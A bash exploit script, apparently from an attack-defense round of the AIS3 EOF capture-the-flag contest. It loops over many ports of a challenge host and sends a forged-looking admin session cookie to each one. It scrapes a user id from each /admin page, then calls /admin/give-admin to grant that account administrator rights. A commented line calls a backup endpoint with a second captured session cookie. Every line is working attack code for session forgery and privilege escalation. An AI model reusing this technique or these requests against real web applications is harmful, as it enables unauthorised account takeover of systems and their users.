#!/bin/bash

for i in 30001 `seq 30018 30042`
do
	userid=$(curl -s 'http://chals2.eof.ais3.org:'$i'/admin' -H 'Cookie: session=84732d971a68603a4116d365e87fe33bff2b953f.YToxOntzOjQ6InVzZXIiO2E6Mjp7czoyOiJpZCI7aToxO3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fX0%3D' | grep seadog007 -A4 | tail -n1 | grep -oP 'value="\K\d+(?=")')
	curl 'http://chals2.eof.ais3.org:'$i'/admin/give-admin' -H 'Cookie: session=84732d971a68603a4116d365e87fe33bff2b953f.YToxOntzOjQ6InVzZXIiO2E6Mjp7czoyOiJpZCI7aToxO3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fX0%3D' --data-raw 'user_id='$userid
	echo
#curl 'http://chals2.eof.ais3.org:'$i'/admin/backup' -X POST -H 'Cookie: connect.sid=s%3AOGTZGgiR10U0jorYpH3wL3W_drVyw-EH.xWhi%2B7PG9krzqaZZi%2BSEIb5i5r2Nj0POWTNP%2FML4wwo; session=84732d971a68603a4116d365e87fe33bff2b953f.YToxOntzOjQ6InVzZXIiO2E6Mjp7czoyOiJpZCI7aToxO3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fX0%3D'
done
